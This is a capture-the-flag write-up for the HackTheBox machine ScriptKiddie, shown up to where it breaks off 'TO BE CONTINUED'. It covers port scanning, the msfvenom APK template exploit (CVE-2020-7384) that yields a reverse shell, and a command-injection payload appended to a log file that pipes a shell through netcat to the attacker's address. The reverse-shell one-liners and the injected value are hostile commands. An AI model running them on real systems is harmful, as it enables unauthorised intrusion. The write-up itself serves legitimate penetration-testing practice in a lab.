# CTF - [HTB ScriptKiddie](http://10.10.10.226:5000/)
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: HEAD POST GET OPTIONS
|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<br/><br/>
Found a site with input fields that could be potential entry points.
<br/><br/>
![Screenshot at 2021-12-03 21-38-40](https://user-images.githubusercontent.com/59718043/144700412-347e85cf-7ea9-498c-807e-81c702acb9a0.png)
<br/><br/>
Another potential vulnerability: `Werkzeug/0.16.1 Python/3.8.5`.

<br/><br/>
Knowing that the site executes binaries from a Linux server, first I tried command injection on the input fields, but unfortunately that didn't work.<br/><br/>
![Screenshot at 2021-12-04 20-32-13](https://user-images.githubusercontent.com/59718043/144734995-99ddb895-5b05-4349-83a1-cea76b3c060d.png)

<br/><br/>
One of the executable programs on this web app is msfvenom. According to searchsploit, msfvenom is vulnerable to [CVE 2020-7384](https://www.exploit-db.com/exploits/49491).
```
└──╼ $searchsploit msfvenom                                                        │                             
------------------------------------------------- ---------------------------------│                   
 Exploit Title                                   |  Path                           │
------------------------------------------------- ---------------------------------│
Metasploit Framework 6.0.11 - msfvenom APK templ | multiple/local/49491.py         │
------------------------------------------------- ---------------------------------│
Shellcodes: No Results
```
<br/><br/>
Used this Metasploit module and ran it, which then returns an APK file that I used to upload to the site's msfvenom payload generator while my netcat is running. This gave me a shell.
<br/><br/>
```
└──╼ $nc -lvp 4444
listening on [any] 4444 ...
10.10.10.226: inverse host lookup failed: Unknown host
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.226] 35390
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```
<br/><br/>
The user.txt flag can be found under the usual user home directory (/home/<user>/).
 
There is another user `pwn`, the plan was to find a way to this account. I used a [secjuice]() resource for this part as I hit a roadblock. 
 ```
 $ nc -nvlp 4445
 ```
 This payload contains a reverse shell that we can push to the log file `hackers`. 
 ```
 echo "1 2 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4445 >/tmp/f #" >> hackers
 ```
```
TO BE CONTINUED  
```
